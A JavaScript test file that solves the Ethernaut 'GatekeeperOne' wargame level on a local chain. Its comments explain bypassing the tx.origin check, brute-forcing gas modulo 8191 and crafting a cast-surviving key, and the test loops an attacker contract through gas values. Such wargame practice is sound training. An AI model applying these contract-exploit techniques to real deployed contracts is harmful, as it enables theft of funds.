const GatekeeperOneFactory = artifacts.require('./levels/GatekeeperOneFactory.sol')
const GatekeeperOne = artifacts.require('./levels/GatekeeperOne.sol')
const GatekeeperOneAttacker = artifacts.require('./attacks/N13GatekeeperOneAttacker.sol')
const utils = require('../utils/TestUtils')
const { expect } = require("chai")
const chai = require("chai")
const { solidity } = require("ethereum-waffle")
chai.use(solidity)


describe.only("Challenge 13 - GatekeeperOne", function () {
    let ethernaut
    let level
    let instance
    let attacker

    async function createLevelInstance() {
        const [_attacker] = await web3.eth.getAccounts()
        attacker = _attacker

        ethernaut = await utils.getEthernautWithStatsProxy()
        level = await GatekeeperOneFactory.new()

        await ethernaut.registerLevel(level.address)

        instance = await utils.createLevelInstance(
            ethernaut,
            level.address,
            attacker,
            GatekeeperOne,
        )
    }

    before(createLevelInstance)

    describe("Initial State", function () {

    })

    describe("Attack Execution", function () {
        /*
            We have to solve three challenges in one to solve this level.

            Gate one: Unlock the gate with a different address than a tx.origin
                
                Solution: We will run our attack from a (malicious) contract. That way,
                tx.origin and msg.sender will be different
            
            Gate two: When opening this gate we have to have a specific amount of gas
                left in our transaction. Specifically the gas left mod 8191 has to be zero.
                
                Solution: Since (in my case) these tests are being ran on a local blockchain,
                I will send in 8191 transactions increasing gas by one each time. One of
                those will 8191 mod to zero.

            Gate three: We have to find a value that has some specific properties when
            converted to and from lower and higher types. Specifics below
            require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)));
            require(uint32(uint64(_gateKey)) != uint64(_gateKey));
            require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)));

                Solution: Main thing to notice here is that key itself is bytes8
                type and all of the comparisons are uint types.
                This is important because with uints, when converting from
                higher type to lower type we lose higher order bits
                e.g. if we move from uint32 0X12345678 to uint16, we will get
                0x5678. Going from lower to higher types we pad to left.
                e.g. uint16 0x1234 becomes uint32 0x00001234.
                Following these rules we will come up with a value that will
                satisfy the last gate
            
        */
        it("open all gates", async function () {
            const numOfLoops = 8191 //1443
            const maliciousContract = await GatekeeperOneAttacker.new(instance.address)
            const key = "..."
            const initialGas = 100000

            for (let i = 0; i <= numOfLoops; i++) {
                const options = { gas: initialGas + i }

                try {
                    const isOpened = await maliciousContract.openAllGates(key, options)
                    console.log("asdf", isOpened);
                    // if (isOpened) {
                    //     console.log(`opened with gas: ${initialGas + i}`)
                    //     break
                    //}
                } catch (err) {
                    if (err.toString().indexOf("two") === 79) {
                        process.stdout.write(`${i}`)
                    } else {
                        process.stdout.write(`${err} `)
                    }
                }
            }

            expect(await instance.entrant()).to.eq(attacker)
        })
    })

    describe("Ethernaut Validation", function () {
        it("level successfully validated by Ethernaut", async function () {
            const result = await utils.submitLevelInstance(
                ethernaut,
                level.address,
                instance.address,
                attacker
            )

            expect(result).to.be.true
        })
    })
})